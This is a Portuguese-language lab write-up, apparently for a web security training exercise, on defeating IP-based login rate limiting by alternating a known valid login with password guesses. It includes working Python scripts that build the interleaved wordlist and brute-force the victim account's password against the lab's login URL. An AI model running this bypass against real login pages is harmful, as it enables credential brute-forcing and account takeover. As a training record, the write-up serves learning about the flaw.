## Objetivo

Quebrar o IP blocking, resetando o rate limit com credenciais de login corretas


## Vulnerabilidade Identificada
O IP block resetava o rate limit a cada login bem sucedido.
isso é uma falha de design, pois permite que um atacante com uma credencial válida de qualquer conta burle a proteção.

## Metodologia
O exercicio me deu as credenciais de login correta wiener:peter, e o usuario da vitima carlos,
com isso criei um script python q fazia a wordlist intercalada entre a brute-force da senha e as credenciais de login correta

## Comandos Utilizados
script python da wordlist intercalada:

```python
with open('/home/luweed/Documents/rockpass.txt') as f:
    senhas = f.read().splitlines()
    
with open('/home/luweed/Documents/intercalada.txt', 'w') as f:
    for i, senha in enumerate(senhas):
        if i % 2 == 0:
            f.write('wiener:peter\n')
        f.write(f'carlos:{senha}\n')
```

script python attackline

```python
import requests

with open('/home/luweed/Documents/intercalada.txt') as f:
    pares = f.read().splitlines()
    
for par in pares:
    user, senha = par.split(':')
    r = requests.post(
    	'https://0aa600b8031b92b7806bd55600e50051.web-security-academy.net/login',
    	data={'username': user, 'password': senha},
    	allow_redirects=False
    )
    if r.status_code == 302 and user == 'carlos':
    	print(f'encontrado: {user}:{senha}')
    	break
```


## Resultado

carlos:monitor

## Lições Aprendidas

Quando um servidor tem reset de rate limit por I.P com credenciais corretas, é possivel criar um payload inteligente com uma wordlist intercalada entre o brute-force e as credenciais corretas.
Assim usando esse vetor de bypass é possivel burlar o rate limit por I.P



